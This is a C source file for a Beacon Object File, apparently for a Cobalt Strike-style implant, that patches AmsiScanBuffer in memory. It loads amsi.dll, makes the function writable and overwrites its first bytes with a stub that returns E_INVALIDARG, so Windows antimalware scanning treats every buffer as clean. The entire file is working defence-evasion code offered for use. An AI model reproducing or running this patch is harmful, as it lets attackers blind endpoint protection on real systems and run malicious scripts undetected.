/*
 * patch_amsi.c — Patch AmsiScanBuffer to return clean result
 *
 * Overwrites the first bytes of AmsiScanBuffer with a stub that
 * returns E_INVALIDARG (0x80070057), causing AMSI to treat every
 * buffer as clean without crashing the host process.
 *
 * Args: none
 */

#include <windows.h>

#define BOF
#include "beacon.h"

/* ── DFR imports ── */
DFR(KERNEL32, LoadLibraryA)
DFR(KERNEL32, GetProcAddress)
DFR(KERNEL32, VirtualProtect)

void go(char* args, int len)
{
    /* Load amsi.dll into the process (may already be loaded) */
    HMODULE hAmsi = KERNEL32$LoadLibraryA("amsi.dll");
    if (hAmsi == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "patch_amsi: LoadLibraryA(\"amsi.dll\") failed (err %lu)",
                     GetLastError());
        return;
    }

    /* Resolve AmsiScanBuffer */
    FARPROC pAmsiScanBuffer = KERNEL32$GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (pAmsiScanBuffer == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "patch_amsi: GetProcAddress(\"AmsiScanBuffer\") failed (err %lu)",
                     GetLastError());
        return;
    }

    /*
     * Patch bytes:
     *   B8 57 00 07 80   mov eax, 0x80070057   ; E_INVALIDARG
     *   C3               ret
     *
     * AmsiScanBuffer returns E_INVALIDARG, which the AMSI consumer
     * interprets as AMSI_RESULT_CLEAN (scan not performed).
     */
    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD patchLen = sizeof(patch);

    /* Make the target region writable */
    DWORD oldProtect = 0;
    if (!KERNEL32$VirtualProtect((LPVOID)pAmsiScanBuffer, patchLen, PAGE_READWRITE, &oldProtect)) {
        BeaconPrintf(CALLBACK_ERROR, "patch_amsi: VirtualProtect(RW) failed (err %lu)",
                     GetLastError());
        return;
    }

    /* Write the patch */
    for (DWORD i = 0; i < patchLen; i++) {
        ((unsigned char*)pAmsiScanBuffer)[i] = patch[i];
    }

    /* Restore original page protection */
    DWORD tmp = 0;
    KERNEL32$VirtualProtect((LPVOID)pAmsiScanBuffer, patchLen, oldProtect, &tmp);

    BeaconPrintf(CALLBACK_OUTPUT, "AMSI patched — AmsiScanBuffer now returns E_INVALIDARG (0x80070057)");
}
